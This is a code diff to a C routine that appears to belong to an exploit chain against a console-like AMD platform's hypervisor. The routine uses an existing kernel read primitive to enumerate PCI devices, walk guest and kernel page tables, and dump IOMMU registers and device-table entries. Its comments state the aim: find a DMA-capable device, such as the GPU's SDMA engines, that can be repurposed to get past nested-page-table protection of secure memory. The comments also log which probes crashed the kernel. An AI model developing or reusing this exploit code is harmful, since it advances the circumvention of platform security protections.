@@ -218,48 +218,32 @@ int prosperous_run(void)
      *   - nPT blocks PA 0x60000000-0x605FFFFF (instant kernel panic)
      *   - SMN reads to DRAM addresses cause machine check (instant panic)
      *   - BAR2 has NO DRAM window (full 16MB scan found only registers)
+     *   - BAR2+0x200000 4-byte scan crashes at ~0x20042C (read-sensitive regs)
+     *   - BAR2 c2p reads (0xF6000+) corrupt A53 command state → panic
      *   - PA 0x60600000-0x607FFFFF accessible via existing DMAP (PD[0x103])
      *
-     * REMAINING APPROACHES:
-     *   A. BAR2+0x200000 "register bus" has PCI device IDs (0x13F01022)
-     *      and 0xDEADBEEF sentinel — might be indirect access mechanism
-     *   B. GPU SDMA can DMA between arbitrary PAs, bypassing nPT
-     *      GPU is likely on PCI bus 1+ behind bridge B0:D1:F0
-     *   C. The nested page tables themselves may be at accessible PAs
-     *
-     * SAFETY: No c2p register reads (0xF6000-0xFB000) — previous run
-     * showed repeated reads corrupt A53 command state → panic.
+     * SAFE DIAGNOSTICS ONLY — all read-only, proven-safe access patterns:
+     *   A. Full PCI bus enumeration (find GPU for SDMA)
+     *   B. Guest page table walk (understand nPT blocking)
+     *   C. IOMMU capability probe (find device table for DMA bypass)
      */
     printf("\n[*] Phase 1.5: Exploring DRAM access mechanisms...\n");
     {
         uint64_t dmap = ctx.dmap_base;
-        uint64_t bar2_kva = dmap + MP4_BAR2_PA;
-        uint32_t probe;
+        (void)0; /* removed BAR2 scan — causes panic at 4-byte stride */
 
-        /* === Part A: Dense scan of BAR2+0x200000 register bus ===
-         * Previous scan found: 0x21C000=0x13F01022 (PCI ID),
-         * 0x21D000=0x13F41022 (PCI ID), 0x21E000=0xDEADBEEF.
-         * These look like results of indirect PCI/register reads.
-         * Scan every 4 bytes from 0x200000-0x220000 to find
-         * the address/control registers for this mechanism. */
-        printf("[*] Part A: Dense BAR2+0x200000 register bus scan...\n");
-        for (uint32_t off = 0x200000; off < 0x220000; off += 4) {
-            probe = 0;
-            kernel_copyout(bar2_kva + off, &probe, 4);
-            /* Print non-zero, non-FFFF values (with 0x100 stride for
-             * density control, but always print interesting values) */
-            if (probe != 0 && probe != 0xFFFFFFFF) {
-                printf("[RB] +0x%06x = 0x%08x\n", off, probe);
-            }
-        }
-
-        /* === Part B: Scan PCI buses 1-4 for GPU ===
-         * The integrated GPU has SDMA engines for DMA between arbitrary
-         * physical addresses. Find it by scanning beyond bus 0.
-         * AMD GPU device IDs: 0x73xx1002 (RDNA2), 0x163x1002, etc.
-         * ECAM: bus<<20 | dev<<15 | func<<12 | reg */
-        printf("\n[*] Part B: Scanning PCI buses 1-4 for GPU...\n");
-        for (uint32_t bus = 1; bus <= 4; bus++) {
+        /* === Part A: Complete PCI enumeration ===
+         * Scan ALL buses 0-15, all devices, all functions.
+         * Looking for:
+         *   - GPU (class 0x030000/0x030200, vendor 0x1002) for SDMA
+         *   - USB/xHCI (class 0x0C0330) for DMA
+         *   - PCIe bridges (class 0x060400) to find device topology
+         *   - Any DMA-capable device we could repurpose
+         *
+         * SAFE: PCI config reads to non-existent devices return 0xFFFFFFFF.
+         * This is identical to what lspci does. */
+        printf("[*] Part A: Full PCI enumeration (buses 0-15)...\n");
+        for (uint32_t bus = 0; bus <= 15; bus++) {
             for (uint32_t dev = 0; dev < 32; dev++) {
                 for (uint32_t func = 0; func < 8; func++) {
                     uint64_t ecam = dmap + MMCFG_BASE +
@@ -270,7 +254,6 @@ int prosperous_run(void)
                     if (dev_id == 0xFFFFFFFF || dev_id == 0)
                         continue;
 
-                    /* Read class code (offset 0x08, bits 31:8) */
                     uint32_t class_reg;
                     kernel_copyout(ecam + 0x08, &class_reg, 4);
                     uint32_t class_code = class_reg >> 8;
@@ -278,46 +261,41 @@ int prosperous_run(void)
                     printf("[PCI] B%u:D%u:F%u ID=0x%08x class=0x%06x",
                            bus, dev, func, dev_id, class_code);
 
-                    /* Read BAR0-BAR5 */
+                    /* Read BAR0-BAR5 for all devices */
                     for (int bar = 0; bar < 6; bar++) {
                         uint32_t bar_val;
                         kernel_copyout(ecam + 0x10 + bar * 4, &bar_val, 4);
                         if (bar_val != 0 && bar_val != 0xFFFFFFFF)
                             printf(" BAR%d=0x%08x", bar, bar_val);
                     }
+
+                    /* For bridges: show secondary/subordinate bus */
+                    if ((class_code >> 8) == 0x0604) {
+                        uint32_t bus_reg;
+                        kernel_copyout(ecam + 0x18, &bus_reg, 4);
+                        printf(" sec=%u sub=%u",
+                               (bus_reg >> 8) & 0xFF,
+                               (bus_reg >> 16) & 0xFF);
+                    }
+
                     printf("\n");
+
+                    /* Skip non-multifunction devices after func 0 */
+                    if (func == 0) {
+                        uint32_t hdr_type;
+                        kernel_copyout(ecam + 0x0C, &hdr_type, 4);
+                        if (!((hdr_type >> 16) & 0x80))
+                            break;  /* Not multi-function, skip func 1-7 */
+                    }
                 }
             }
         }
 
-        /* Also scan bus 0 functions 1-7 for multi-function devices */
-        printf("[*] Scanning bus 0 multi-function devices...\n");
-        for (uint32_t dev = 0; dev < 32; dev++) {
-            for (uint32_t func = 1; func < 8; func++) {
-                uint64_t ecam = dmap + MMCFG_BASE +
-                    ((uint64_t)dev << 15) + ((uint64_t)func << 12);
-                uint32_t dev_id;
-                kernel_copyout(ecam, &dev_id, 4);
-                if (dev_id == 0xFFFFFFFF || dev_id == 0)
-                    continue;
-                uint32_t class_reg;
-                kernel_copyout(ecam + 0x08, &class_reg, 4);
-                printf("[PCI] B0:D%u:F%u ID=0x%08x class=0x%06x\n",
-                       dev, func, dev_id, class_reg >> 8);
-            }
-        }
-
-        /* === Part C: Walk the nested page table ===
-         * The nCR3 is in the VMCB, which we can't access directly.
-         * But we CAN find the nPT by looking at what the HV stores.
-         *
-         * Alternative: walk the GUEST PML4 to find PD[0x100] entry.
-         * If PD[0x100] exists but maps to a guest-PA that the nPT
-         * blocks, we need to find the nPT entry for that PA.
-         *
-         * First, let's read the full PD for the DMAP + 0x60000000 region
-         * to understand ALL the page directory entries (0x100-0x103+). */
-        printf("\n[*] Part C: Walking guest page tables for DMAP+0x60000000...\n");
+        /* === Part B: Guest page table walk ===
+         * Walk PML4 → PDPT → PD for DMAP + 0x60000000 region.
+         * Shows exactly which PD entries exist vs "not present".
+         * SAFE: reads from guest page tables via DMAP. */
+        printf("\n[*] Part B: Walking guest page tables for DMAP+0x60000000...\n");
         {
             uint64_t target_va = dmap + MP4_DRAM_BASE;
             uint32_t pml4_idx = (target_va >> 39) & 0x1FF;
@@ -338,31 +316,85 @@ int prosperous_run(void)
                     pd_pa = pdpte & 0xFFFFFFFFFF000ULL;
                     printf("[PT] PD base PA = 0x%lx\n", pd_pa);
 
-                    /* Dump PD entries 0x100-0x107 (covers PA 0x60000000-0x60FFFFFF) */
-                    for (int i = 0; i < 8; i++) {
+                    /* Dump PD entries 0x0FE-0x107 (wider window around
+                     * 0x60000000 region to see boundary behavior) */
+                    for (int i = -2; i < 8; i++) {
+                        int idx = (int)pd_idx + i;
+                        if (idx < 0) continue;
                         uint64_t pde;
-                        kernel_copyout(dmap + pd_pa + (pd_idx + i) * 8, &pde, 8);
+                        kernel_copyout(dmap + pd_pa + idx * 8, &pde, 8);
                         if (pde & 1) {
                             int is_2m = (pde >> 7) & 1;
                             uint64_t pa = pde & 0xFFFFFFFFFF000ULL;
                             if (is_2m) pa &= ~0x1FFFFFULL;
-                            printf("[PT] PD[0x%x] = 0x%016lx (%s PA=0x%lx)\n",
-                                   pd_idx + i, pde,
-                                   is_2m ? "2MB" : "4KB-PT", pa);
+                            printf("[PT] PD[0x%x] = 0x%016lx (%s PA=0x%lx flags=%s%s%s%s)\n",
+                                   idx, pde,
+                                   is_2m ? "2MB" : "4KB-PT", pa,
+                                   (pde & (1ULL << 0)) ? "P" : "",
+                                   (pde & (1ULL << 1)) ? "W" : "r",
+                                   (pde & (1ULL << 2)) ? "U" : "s",
+                                   (pde & (1ULL << 4)) ? " PCD" : "");
                         } else {
-                            printf("[PT] PD[0x%x] = not present\n", pd_idx + i);
+                            printf("[PT] PD[0x%x] = 0x%016lx (not present)\n",
+                                   idx, pde);
                         }
                     }
                 }
             }
+
+            /* Also walk the KERNEL page tables (not process tables).
+             * The kernel pmap may have different entries for the DMAP. */
+            printf("\n[*] Walking KERNEL page tables...\n");
+            uint64_t kpmap_va = ctx.ktext_base +
+                                (uint64_t)KOFF_KERNEL_PMAP;
+            uint64_t kcr3;
+            kernel_copyout(kpmap_va + OFF_PMAP_PM_CR3, &kcr3, 8);
+            printf("[PT] Kernel CR3 = 0x%lx\n", kcr3);
+
+            if (kcr3 != cr3) {
+                uint64_t target_va2 = dmap + MP4_DRAM_BASE;
+                uint32_t kpml4_idx = (target_va2 >> 39) & 0x1FF;
+                uint32_t kpdpt_idx = (target_va2 >> 30) & 0x1FF;
+                uint32_t kpd_idx   = (target_va2 >> 21) & 0x1FF;
+
+                kernel_copyout(dmap + kcr3 + kpml4_idx * 8, &pml4e, 8);
+                printf("[PT] Kernel PML4[0x%x] = 0x%016lx\n", kpml4_idx, pml4e);
+
+                if (pml4e & 1) {
+                    uint64_t kpdpt_pa = pml4e & 0xFFFFFFFFFF000ULL;
+                    kernel_copyout(dmap + kpdpt_pa + kpdpt_idx * 8, &pdpte, 8);
+                    printf("[PT] Kernel PDPT[0x%x] = 0x%016lx\n", kpdpt_idx, pdpte);
+
+                    if ((pdpte & 1) && !(pdpte & (1 << 7))) {
+                        pd_pa = pdpte & 0xFFFFFFFFFF000ULL;
+                        for (int i = -2; i < 8; i++) {
+                            int idx = (int)kpd_idx + i;
+                            if (idx < 0) continue;
+                            uint64_t pde;
+                            kernel_copyout(dmap + pd_pa + idx * 8, &pde, 8);
+                            if (pde & 1) {
+                                int is_2m = (pde >> 7) & 1;
+                                uint64_t pa = pde & 0xFFFFFFFFFF000ULL;
+                                if (is_2m) pa &= ~0x1FFFFFULL;
+                                printf("[PT] Kernel PD[0x%x] = 0x%016lx (%s PA=0x%lx)\n",
+                                       idx, pde, is_2m ? "2MB" : "4KB-PT", pa);
+                            } else {
+                                printf("[PT] Kernel PD[0x%x] = not present\n", idx);
+                            }
+                        }
+                    }
+                }
+            } else {
+                printf("[PT] Kernel CR3 == process CR3 (shared page tables)\n");
+            }
         }
 
-        /* === Part D: Probe the IOMMU for configuration ===
-         * AMD IOMMU at B0:D1:F0 (0x13E21022). Read its capability
-         * registers and find the IOMMU MMIO base address.
-         * IOMMU CAP is at PCI config offset 0x40+. The MMIO base
-         * is in the IOMMU Base Address Low/High registers. */
-        printf("\n[*] Part D: IOMMU configuration probe...\n");
+        /* === Part C: IOMMU capability and device table probe ===
+         * Find IOMMU MMIO base, read device table base register,
+         * then dump first few device table entries to understand
+         * what devices have IOMMU translations configured.
+         * SAFE: PCI config reads + IOMMU MMIO reads. */
+        printf("\n[*] Part C: IOMMU configuration probe...\n");
         {
             uint64_t iommu_ecam = dmap + pci_cfg_addr(0, 1, 0, 0);
             uint32_t dev_id;
@@ -380,25 +412,71 @@ int prosperous_run(void)
                 uint32_t cap_hdr;
                 kernel_copyout(iommu_ecam + cap_ptr, &cap_hdr, 4);
                 uint8_t cap_id = cap_hdr & 0xFF;
-                printf("[IOMMU] Cap @ 0x%02x: ID=0x%02x\n", cap_ptr, cap_id);
+                printf("[IOMMU] Cap @ 0x%02x: ID=0x%02x hdr=0x%08x\n",
+                       cap_ptr, cap_id, cap_hdr);
 
                 if (cap_id == 0x0F) {
-                    /* IOMMU capability found. Base address at cap+4 and cap+8 */
+                    /* IOMMU capability found */
                     uint32_t base_lo, base_hi;
                     kernel_copyout(iommu_ecam + cap_ptr + 4, &base_lo, 4);
                     kernel_copyout(iommu_ecam + cap_ptr + 8, &base_hi, 4);
                     uint64_t iommu_base = ((uint64_t)base_hi << 32) |
                                           (base_lo & 0xFFFFC000ULL);
-                    printf("[IOMMU] MMIO base PA = 0x%lx\n", iommu_base);
+                    printf("[IOMMU] MMIO base PA = 0x%lx (lo=0x%08x hi=0x%08x)\n",
+                           iommu_base, base_lo, base_hi);
 
-                    /* Read DeviceTable base from IOMMU MMIO offset 0x00 */
-                    uint64_t dt_lo;
-                    kernel_copyout(dmap + iommu_base + 0x00, &dt_lo, 8);
-                    printf("[IOMMU] DeviceTable base reg = 0x%016lx\n", dt_lo);
+                    /* Read IOMMU MMIO registers */
+                    uint64_t dt_base;
+                    kernel_copyout(dmap + iommu_base + 0x00, &dt_base, 8);
+                    printf("[IOMMU] DeviceTable base = 0x%016lx\n", dt_base);
+
+                    uint64_t cmd_base;
+                    kernel_copyout(dmap + iommu_base + 0x08, &cmd_base, 8);
+                    printf("[IOMMU] CmdBuffer base  = 0x%016lx\n", cmd_base);
+
+                    uint64_t evt_base;
+                    kernel_copyout(dmap + iommu_base + 0x10, &evt_base, 8);
+                    printf("[IOMMU] EventLog base   = 0x%016lx\n", evt_base);
+
+                    uint64_t ctrl;
+                    kernel_copyout(dmap + iommu_base + 0x18, &ctrl, 8);
+                    printf("[IOMMU] Control reg     = 0x%016lx\n", ctrl);
+
+                    /* Extract device table PA and size */
+                    uint64_t dt_pa = dt_base & 0xFFFFFFFFF000ULL;
+                    uint32_t dt_size = ((dt_base & 0x1FF) + 1) * 4096;
+                    printf("[IOMMU] DeviceTable PA=0x%lx size=%u bytes (%u entries)\n",
+                           dt_pa, dt_size, dt_size / 32);
+
+                    /* Dump first 8 device table entries (each 32 bytes)
+                     * to understand the IOMMU configuration */
+                    printf("[IOMMU] First 8 device table entries:\n");
+                    for (int e = 0; e < 8; e++) {
+                        uint64_t dte[4];
+                        for (int w = 0; w < 4; w++)
+                            kernel_copyout(dmap + dt_pa + e * 32 + w * 8,
+                                          &dte[w], 8);
+                        if (dte[0] || dte[1] || dte[2] || dte[3]) {
+                            printf("[IOMMU] DTE[%d]: %016lx %016lx %016lx %016lx\n",
+                                   e, dte[0], dte[1], dte[2], dte[3]);
+                        }
+                    }
+
+                    /* Also check if there's a second IOMMU instance */
+                    uint32_t range_reg;
+                    kernel_copyout(iommu_ecam + cap_ptr + 0x0C, &range_reg, 4);
+                    printf("[IOMMU] Range reg = 0x%08x\n", range_reg);
+
                     break;
                 }
                 cap_ptr = (cap_hdr >> 8) & 0xFF;
             }
+
+            /* Check for second IOMMU at B0:D1:F1 */
+            uint64_t iommu2_ecam = dmap + pci_cfg_addr(0, 1, 1, 0);
+            kernel_copyout(iommu2_ecam, &dev_id, 4);
+            if (dev_id != 0xFFFFFFFF && dev_id != 0)
+                printf("[IOMMU] B0:D1:F1 ID=0x%08x (second IOMMU)\n", dev_id);
         }
     }
 
